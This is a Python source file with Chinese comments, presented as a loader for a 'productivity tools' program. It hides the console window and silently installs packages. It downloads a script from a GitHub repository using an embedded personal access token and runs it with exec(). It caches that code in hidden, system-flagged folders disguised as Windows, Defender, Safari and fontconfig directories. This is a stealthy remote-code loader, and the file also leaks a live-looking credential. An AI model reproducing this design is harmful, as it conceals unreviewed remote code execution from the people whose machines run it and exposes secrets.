#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
轻量级工具加载器
负责从GitHub仓库加载主界面代码并运行
作者: jwwl520
版本: 1.0
"""

# 尽早隐藏控制台窗口，避免黑框闪现
import platform
if platform.system() == 'Windows':
    try:
        import ctypes
        import sys
        # 获取控制台窗口句柄并立即隐藏
        console_window = ctypes.windll.kernel32.GetConsoleWindow()
        if console_window != 0:
            ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE
    except:
        pass

import os
import sys
import json
import threading
import time
import base64
import hashlib
import secrets
import subprocess
import shutil
import uuid
import webbrowser
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime
import tkinter as tk
from tkinter import messagebox, ttk, filedialog

try:
    import requests
except ImportError:
    # 静默安装requests库，避免弹出黑框
    try:
        import subprocess
        # 使用CREATE_NO_WINDOW标志避免弹出命令窗口
        if platform.system() == 'Windows':
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], 
                                startupinfo=startupinfo, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        import requests
    except Exception:
        # 如果安装失败，使用urllib作为备选
        requests = None

class ToolLauncher:
    def __init__(self):
        # 核心配置
        self._config = {
            'token': "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",
            'main_repo': {
                'owner': 'jwwl520',
                'repo': 'Productivity-tool-integration',  # 主界面代码仓库
                'main_file': '生产力工具整合.py'  # 主界面文件名
            }
        }
        
        # 基本设置 - 永久缓存，深度隐藏
        self.machine_id = self.get_machine_id()
        self.cache_dir = self.get_or_create_hidden_cache_dir()
        self.main_code_cache = os.path.join(self.cache_dir, self.get_hashed_filename('main_interface.py'))
        self.cache_info = os.path.join(self.cache_dir, self.get_hashed_filename('cache_info.json'))
        # 永久缓存 - 不设置过期时间
        
        # 确保缓存目录存在
        self.ensure_cache_directory()

    def get_machine_id(self):
        """生成机器唯一标识"""
        machine_info = {
            'hostname': platform.node(),
            'system': platform.system(),
            'processor': platform.processor(),
            'mac_address': hex(uuid.getnode())
        }
        machine_string = json.dumps(machine_info, sort_keys=True)
        return hashlib.md5(machine_string.encode()).hexdigest()[:16]

    def get_hashed_filename(self, original_name):
        """生成哈希文件名"""
        name_hash = hashlib.md5(f"{original_name}_{self.machine_id}".encode()).hexdigest()[:12]
        return f"{name_hash}.dat"

    def get_system_config_path(self):
        """获取系统深层目录中的配置文件路径"""
        system = platform.system()
        
        if system == 'Windows':
            base_path = os.environ.get('PROGRAMDATA', 'C:\\ProgramData')
            deep_path = os.path.join(
                base_path,
                'Microsoft',
                'Windows',
                'WER',
                'Temp',
                f'.{secrets.token_hex(6)}',
                'Cache',
                f'{self.machine_id[:8]}.cfg'
            )
        elif system == 'Darwin':
            base_path = os.path.expanduser('~/Library')
            deep_path = os.path.join(
                base_path,
                'Caches',
                'com.apple.Safari',
                'WebKitCache',
                f'.{secrets.token_hex(6)}',
                f'{self.machine_id[:8]}.plist'
            )
        else:
            base_path = os.path.expanduser('~/.cache')
            deep_path = os.path.join(
                base_path,
                'fontconfig',
                f'.{secrets.token_hex(6)}',
                f'{self.machine_id[:8]}.conf'
            )
        
        return deep_path

    def save_system_config(self, config_data):
        """保存配置到系统深层目录"""
        try:
            system_config_file = self.get_system_config_path()
            config_dir = os.path.dirname(system_config_file)
            
            if not os.path.exists(config_dir):
                os.makedirs(config_dir)
                if platform.system() == 'Windows':
                    try:
                        subprocess.run(['attrib', '+H', config_dir], capture_output=True)
                    except:
                        pass
            
            with open(system_config_file, 'w', encoding='utf-8') as f:
                json.dump(config_data, f, indent=2, ensure_ascii=False)
                
            if platform.system() == 'Windows':
                try:
                    subprocess.run(['attrib', '+H', system_config_file], capture_output=True)
                except:
                    pass
        except Exception as e:
            # 静默处理保存失败
            pass

    def get_or_create_hidden_cache_dir(self):
        """获取或创建深度隐藏的缓存目录"""
        config_key = 'launcher_cache_dir'
        system_config_file = self.get_system_config_path()
        
        # 尝试从系统配置文件读取已存在的目录
        if os.path.exists(system_config_file):
            try:
                with open(system_config_file, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    if config_key in config and os.path.exists(config[config_key]):
                        return config[config_key]
            except:
                pass
        
        # 生成C盘深层伪装目录结构
        dir_hash = hashlib.md5(f"launcher_{self.machine_id}".encode()).hexdigest()
        
        # Windows系统深层伪装路径
        if platform.system() == 'Windows':
            base_paths = [
                os.path.join('C:', 'Windows', 'System32', 'drivers', 'etc', 'ssl', 'certs'),
                os.path.join('C:', 'Windows', 'SysWOW64', 'config', 'systemprofile', 'AppData', 'LocalLow'),
                os.path.join('C:', 'ProgramData', 'Microsoft', 'Windows Defender', 'Platform', 'Backup'),
                os.path.join('C:', 'Windows', 'Temp', '.NET Framework Setup Cache', 'Client'),
                os.path.join('C:', 'Windows', 'Microsoft.NET', 'assembly', 'GAC_64', 'temp')
            ]
        else:
            base_paths = [
                os.path.expanduser('~/.local/share/applications/.cache'),
                os.path.expanduser('~/.config/fontconfig/.tmp'),
                '/var/cache/fontconfig/.hidden',
                '/tmp/.system-cache'
            ]
        
        # 选择一个可写的基础路径
        cache_dir = None
        for base_path in base_paths:
            try:
                dir_name = f".{dir_hash[:16]}"
                test_cache_dir = os.path.join(base_path, dir_name)
                
                if not os.path.exists(test_cache_dir):
                    os.makedirs(test_cache_dir, exist_ok=True)
                
                # 测试写入权限
                test_file = os.path.join(test_cache_dir, 'test.tmp')
                with open(test_file, 'w') as f:
                    f.write('test')
                os.remove(test_file)
                
                cache_dir = test_cache_dir
                break
                
            except (OSError, PermissionError):
                continue
        
        # 如果所有深层路径都失败，回退到用户目录的隐藏文件夹
        if not cache_dir:
            fallback_dir = os.path.expanduser(f"~/.cache/.{dir_hash[:16]}")
            os.makedirs(fallback_dir, exist_ok=True)
            cache_dir = fallback_dir
        
        # 在Windows上设置隐藏和系统属性
        if platform.system() == 'Windows':
            try:
                subprocess.run(['attrib', '+H', '+S', cache_dir], check=True, capture_output=True)
                parent_dir = os.path.dirname(cache_dir)
                subprocess.run(['attrib', '+H', parent_dir], capture_output=True)
            except:
                pass
        
        # 保存配置
        config_data = {
            config_key: cache_dir,
            'created_at': datetime.now().isoformat()
        }
        self.save_system_config(config_data)
        return cache_dir
        
    def ensure_cache_directory(self):
        """确保缓存目录存在"""
        if not os.path.exists(self.cache_dir):
            os.makedirs(self.cache_dir)
            
    def is_cache_valid(self):
        """检查缓存是否存在 - 永久缓存，只检查文件存在性"""
        return (os.path.exists(self.main_code_cache) and 
                os.path.exists(self.cache_info) and
                os.path.getsize(self.main_code_cache) > 0)
            
    def github_request(self, owner, repo, path=""):
        """GitHub API请求"""
        if path:
            url = f"https://api.github.com/repos/{owner}/{repo}/contents/{path}"
        else:
            url = f"https://api.github.com/repos/{owner}/{repo}/contents"
            
        headers = {
            'Authorization': f'token {self._config["token"]}',
            'Accept': 'application/vnd.github.v3+json',
            'User-Agent': 'Tool-Launcher'
        }
        
        try:
            # 检查requests是否可用
            if requests is None:
                # 如果requests不可用，使用urllib作为备选
                return self.github_request_urllib(url, headers)
            
            response = requests.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                return response.json()
            else:
                # 静默处理API错误
                return None
        except Exception as e:
            # 静默处理网络请求失败
            return None
    
    def github_request_urllib(self, url, headers):
        """使用urllib的备选GitHub API请求"""
        try:
            import urllib.request
            import json
            
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=30) as response:
                if response.getcode() == 200:
                    data = response.read().decode('utf-8')
                    return json.loads(data)
            return None
        except Exception:
            return None
            
    def download_main_interface(self, force_update=False):
        """下载主界面代码 - 永久缓存"""
        # 如果缓存有效且不强制更新，从缓存加载
        if not force_update and self.is_cache_valid():
            try:
                with open(self.main_code_cache, 'r', encoding='utf-8') as f:
                    return f.read()
            except Exception as e:
                # 静默处理缓存读取失败
                pass
        
        # 从GitHub获取最新代码
        repo_config = self._config['main_repo']
        result = self.github_request(
            repo_config['owner'], 
            repo_config['repo'], 
            repo_config['main_file']
        )
        
        if result and 'content' in result:
            try:
                # 解码Base64内容
                content = base64.b64decode(result['content']).decode('utf-8')
                
                # 保存到缓存（使用哈希文件名）
                with open(self.main_code_cache, 'w', encoding='utf-8') as f:
                    f.write(content)
                    
                # 更新缓存信息
                cache_info = {
                    'cached_at': datetime.now().isoformat(),
                    'file_size': len(content),
                    'sha': result.get('sha', ''),
                    'permanent_cache': True
                }
                
                with open(self.cache_info, 'w', encoding='utf-8') as f:
                    json.dump(cache_info, f, indent=2, ensure_ascii=False)
                
                return content
                
            except Exception as e:
                # 静默处理主界面代码处理失败
                return None
        else:
            # 无法获取主界面代码，静默退出
            return None
            
            
    def show_loading_window(self):
        """显示加载窗口"""
        loading_window = tk.Tk()
        loading_window.title("工具加载器")
        loading_window.geometry("450x250")
        loading_window.resizable(False, False)
        loading_window.configure(bg='#f0f0f0')
        
        # 确保窗口在前台显示
        loading_window.attributes('-topmost', True)
        loading_window.focus_force()
        
        # 居中显示
        loading_window.update_idletasks()
        x = (loading_window.winfo_screenwidth() - loading_window.winfo_width()) // 2
        y = (loading_window.winfo_screenheight() - loading_window.winfo_height()) // 2
        loading_window.geometry(f"+{x}+{y}")
        
        # 内容框架
        frame = tk.Frame(loading_window, bg='#f0f0f0', padx=40, pady=40)
        frame.pack(fill=tk.BOTH, expand=True)
        
        # 图标
        icon_label = tk.Label(frame, text="🚀", 
                             font=("Microsoft YaHei UI", 32),
                             bg='#f0f0f0')
        icon_label.pack(pady=(0, 10))
        
        # 标题
        title_label = tk.Label(frame, text="生产力工具加载器", 
                              font=("Microsoft YaHei UI", 16, "bold"),
                              bg='#f0f0f0', fg='#2c3e50')
        title_label.pack(pady=(0, 10))
        
        # 版本信息
        version_label = tk.Label(frame, text="v1.2 - 轻量级客户端", 
                                font=("Microsoft YaHei UI", 9),
                                bg='#f0f0f0', fg='#7f8c8d')
        version_label.pack(pady=(0, 20))
        
        # 状态标签
        self.status_label = tk.Label(frame, text="正在初始化...",
                                    font=("Microsoft YaHei UI", 10),
                                    bg='#f0f0f0', fg='#666666')
        self.status_label.pack(pady=(0, 20))
        
        # 进度条
        self.progress = ttk.Progressbar(frame, mode='indeterminate', length=300)
        self.progress.pack()
        self.progress.start()
        
        # 确保在窗口关闭时停止进度条
        def on_close():
            try:
                self.progress.stop()
            except:
                pass
            loading_window.destroy()
        loading_window.protocol("WM_DELETE_WINDOW", on_close)
        
        return loading_window
        
    def update_loading_status(self, message):
        """更新加载状态"""
        if hasattr(self, 'status_label'):
            self.status_label.config(text=message)
            
    def run_main_interface(self, main_code):
        """运行主界面代码"""
        try:
            # 完全重定向标准输出和错误输出，防止显示命令行窗口
            import io
            import sys
            
            # 保存原始输出流
            old_stdout = sys.stdout
            old_stderr = sys.stderr
            
            # 创建空的输出流，丢弃所有print输出
            devnull = io.StringIO()
            sys.stdout = devnull
            sys.stderr = devnull
            
            try:
                # 创建执行环境
                globals_dict = {
                    '__name__': '__main__',
                    '__file__': self.main_code_cache,
                    '__builtins__': __builtins__,
                    # 提供给主界面的工具
                    'launcher': self,
                    'cache_dir': self.cache_dir,
                    'github_request': self.github_request,
                    # 基本模块
                    'os': os,
                    'sys': sys,
                    'json': json,
                    'platform': platform,
                    'threading': threading,
                    'time': time,
                    'datetime': datetime,
                    'requests': requests,
                    'base64': base64,
                    'webbrowser': webbrowser,
                    'subprocess': subprocess,
                    'shutil': shutil,
                    'hashlib': hashlib,
                    'secrets': secrets,
                    'uuid': uuid,
                    # urllib模块
                    'urllib': __import__('urllib'),
                    # tkinter模块
                    'tk': tk,
                    'ttk': ttk,
                    'messagebox': messagebox,
                    'filedialog': filedialog,
                }
                
                # 启动主界面
                exec(main_code, globals_dict)
                
            finally:
                # 恢复标准输出和错误输出
                sys.stdout = old_stdout
                sys.stderr = old_stderr
            
        except Exception as e:
            # 恢复输出流后再显示错误信息
            try:
                sys.stdout = old_stdout
                sys.stderr = old_stderr
            except:
                pass
                
            # 显示具体错误信息，帮助调试
            import traceback
            error_details = traceback.format_exc()
            try:
                messagebox.showerror("主界面启动失败", f"错误详情：\n{str(e)}\n\n详细信息：\n{error_details}")
            except:
                # 如果messagebox也失败，静默处理
                pass
            
    def run(self):
        """启动加载器"""
        try:
            # 显示加载窗口
            loading_window = self.show_loading_window()
            
            def load_and_run():
                try:
                    # 更新状态
                    loading_window.after(0, lambda: self.update_loading_status("正在检查更新..."))
                    time.sleep(0.5)
                    
                    # 下载主界面代码
                    loading_window.after(0, lambda: self.update_loading_status("正在下载主界面..."))
                    main_code = self.download_main_interface()
                    
                    if main_code:
                        loading_window.after(0, lambda: self.update_loading_status("正在启动主界面..."))
                        time.sleep(0.5)
                        
                        # 设置标志，准备关闭加载窗口
                        def close_and_start():
                            try:
                                self.progress.stop()
                            except:
                                pass
                            loading_window.destroy()
                            self.run_main_interface(main_code)
                        
                        # 关闭加载窗口并启动主界面
                        loading_window.after(100, close_and_start)
                        
                    else:
                        loading_window.after(0, lambda: self.update_loading_status("连接失败"))
                        loading_window.after(1000, loading_window.destroy)
                        # 显示更详细的错误信息
                        messagebox.showerror("连接错误", "无法连接到GitHub服务器获取主界面代码。\n\n可能的原因：\n1. 网络连接问题\n2. GitHub服务器暂时无法访问\n3. 需要VPN连接\n\n请检查网络连接后重试。")
                        
                except Exception as e:
                    error_msg = f"加载过程中发生错误: {str(e)}"
                    loading_window.after(0, lambda: self.update_loading_status("加载失败"))
                    loading_window.after(0, lambda: messagebox.showerror("加载错误", error_msg))
                    loading_window.after(2000, loading_window.destroy)
            
            # 在后台线程中执行加载
            threading.Thread(target=load_and_run, daemon=True).start()
            
            # 启动加载窗口主循环
            loading_window.mainloop()
            
        except Exception as e:
            messagebox.showerror("启动失败", f"加载器启动失败: {str(e)}")


def main():
    """主函数"""
    # 首先尽早隐藏控制台窗口 (Windows)
    if platform.system() == 'Windows':
        try:
            import ctypes
            # 获取控制台窗口句柄并隐藏
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window != 0:
                ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE
                # 可选：完全释放控制台
                # ctypes.windll.kernel32.FreeConsole()
        except:
            pass
    
    try:
        launcher = ToolLauncher()
        launcher.run()
    except KeyboardInterrupt:
        # 静默处理用户取消
        pass
    except Exception as e:
        # 显示关键错误信息
        try:
            messagebox.showerror("启动错误", f"程序启动失败: {str(e)}")
        except:
            # 如果messagebox失败，静默退出
            pass


if __name__ == "__main__":
    main()
